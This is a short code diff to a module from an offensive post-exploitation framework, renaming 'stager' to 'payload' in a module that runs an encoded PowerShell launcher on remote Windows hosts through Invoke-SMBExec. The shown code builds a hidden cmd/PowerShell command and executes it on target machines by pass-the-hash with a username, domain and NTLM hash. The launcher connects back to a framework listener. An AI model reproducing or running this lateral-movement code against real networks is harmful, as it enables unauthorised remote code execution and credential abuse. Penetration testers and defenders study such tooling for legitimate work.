@@ -9,7 +9,7 @@ class Module:
 
             'Author': ['@rvrsh3ll'],
 
-            'Description': ('Executes a stager on remote hosts using SMBExec.ps1'),
+            'Description': ('Executes a payload on remote hosts using SMBExec.ps1'),
 
             'Background' : False,
 
@@ -41,7 +41,7 @@ class Module:
                 'Value'         :   ''                
             },
             'ComputerName' : {
-                'Description'   :   'Host[s] to execute the stager on, comma separated.',
+                'Description'   :   'Host[s] to execute the payload on, comma separated.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
@@ -136,15 +136,15 @@ class Module:
         else:
 
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
 
             if launcher == "":
                 print helpers.color("[!] Error in launcher generation.")
                 return ""
             else:
 
-                stagerCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
-                scriptEnd = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computerName, userName, domain, NTLMhash, stagerCmd)
+                payloadCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
+                scriptEnd = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computerName, userName, domain, NTLMhash, payloadCmd)
 
 
         scriptEnd += "| Out-String | %{$_ + \"`n\"};"
